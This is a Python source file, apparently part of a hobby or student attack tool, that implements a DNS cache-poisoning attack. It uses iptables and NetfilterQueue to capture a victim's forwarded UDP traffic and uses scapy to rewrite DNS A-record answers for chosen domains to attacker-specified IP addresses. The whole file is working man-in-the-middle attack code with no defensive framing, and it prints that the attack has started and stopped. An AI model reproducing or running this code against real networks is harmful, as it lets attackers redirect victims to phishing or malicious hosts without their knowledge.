from scapy.all import *
from netfilterqueue import NetfilterQueue     #Library capable of handling IP packets
import threading
import os
import re

class DnsPoisoner():

    def __init__(self, ip_victim, queue_num):

        self.urls_to_spoof = {}
        self.queue         = NetfilterQueue()    #Initialize netfilterqueue object  
        #Create rules on how to handles packets destined for your LAN
        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue-num {}".format(ip_victim, queue_num)    #packets matching this rule get send to queue_num
        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue-num {}".format(ip_victim, queue_num)    #Restores original ip rule
        self.thread        = threading.Thread(name="dns-poisoner-{}".format(queue_num), target=self.queue.run)
        self.thread.setDaemon(True)

        #Initialize queue identified by queue_num and specify that the packets are passed as arguments of handle_packet()
        self.queue.bind(queue_num, self.handle_packet) 

    def add_url(self, url, ip):

        url_pattern = re.compile(url.replace(".", "[.]").replace("*", ".*"))
        self.urls_to_spoof[url_pattern] = ip

    def get_ip(self, url):
        
        for url_pattern in self.urls_to_spoof.keys():
            if url_pattern.match(url):
                return self.urls_to_spoof[url_pattern]

    def handle_packet(self, packet_nfqueue):
        """Handles each packet in the queue by editing them if neccessary."""
        packet_scapy = IP(packet_nfqueue.get_payload())    #converts the raw packet to a scapy compatible string

        if packet_scapy.haslayer(DNSRR):
            packet_scapy = self.edit_dnsrr(packet_scapy)    #edit packet for spoof
            packet_nfqueue.set_payload(bytes(packet_scapy))    #converts scapy compatible string back to raw packet

        packet_nfqueue.accept()    #accept the packet and release it back into the wild

    def edit_dnsrr(self, packet):
        """Edits DNS request answer in order to poison"""

        ip_to_spoof = self.get_ip(packet[DNSQR].qname)

        if ip_to_spoof:

            if packet[DNSQR].qtype == 1:
                packet[DNSRR].rdata = ip_to_spoof
                packet[DNS].ancount = 1
                del(packet[IP].len)
                del(packet[IP].chksum)
                del(packet[UDP].len)
                del(packet[UDP].chksum)
            
            elif packet[DNSQR].qtype == 28:
                pass # TODO wat te doen met ipv6?

        return packet

    def start(self):

        os.system(self.iprule_add)    #make sure DNS packets are intercepted
        self.thread.start()    #queue starts accepting packages

        print "DNS poisoning attack started"

    def stop(self):

        os.system(self.iprule_remove)    #make sure DNS packets are not intercepted anymore
        self.queue.unbind()    #delete queue

        print "DNS poisoning attack stopped"
